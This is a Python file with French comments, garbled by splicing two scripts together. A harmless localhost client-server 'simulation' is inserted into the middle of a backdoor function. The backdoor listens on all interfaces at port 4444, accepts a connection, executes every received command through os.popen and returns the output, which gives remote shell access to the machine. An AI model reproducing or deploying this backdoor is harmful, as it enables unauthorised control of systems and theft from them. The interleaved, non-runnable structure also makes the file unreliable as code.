import socket
import os

def backdoor():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", 4444))  # Écoute sur le port 4444
    s.listen(5)
    print("En attente d'une connexion...")
    
    conn, addr = s.accept()
    print(f"Connexion établie par {addr}")
# network_simulation.py
# Script pour simuler une connexion client-serveur (alternative éthique au backdoor)

import socket
import threading

def server():
    """
    Simule un serveur écoutant les connexions entrantes.
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('localhost', 12345))
    server_socket.listen(1)
    print("Serveur en écoute sur localhost:12345...")
    
    conn, addr = server_socket.accept()
    print(f"Connexion établie avec {addr}")
    
    while True:
        data = conn.recv(1024).decode()
        if not data:
            break
        print(f"Message reçu : {data}")
        conn.send(f"Serveur a reçu : {data}".encode())
    
    conn.close()
    server_socket.close()

def client():
    """
    Simule un client se connectant au serveur.
    """
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect(('localhost', 12345))
    
    message = input("Entrez un message à envoyer au serveur : ")
    client_socket.send(message.encode())
    
    response = client_socket.recv(1024).decode()
    print(f"Réponse du serveur : {response}")
    
    client_socket.close()

if __name__ == "__main__":
    # Lancer le serveur dans un thread séparé
    server_thread = threading.Thread(target=server)
    server_thread.start()
    
    # Attendre un court instant pour que le serveur soit prêt
    import time
    time.sleep(1)
    
    # Lancer le client
    client()
    while True:
        command = conn.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = os.popen(command).read()
        conn.send(output.encode())

    conn.close()

if __name__ == "__main__":
    backdoor()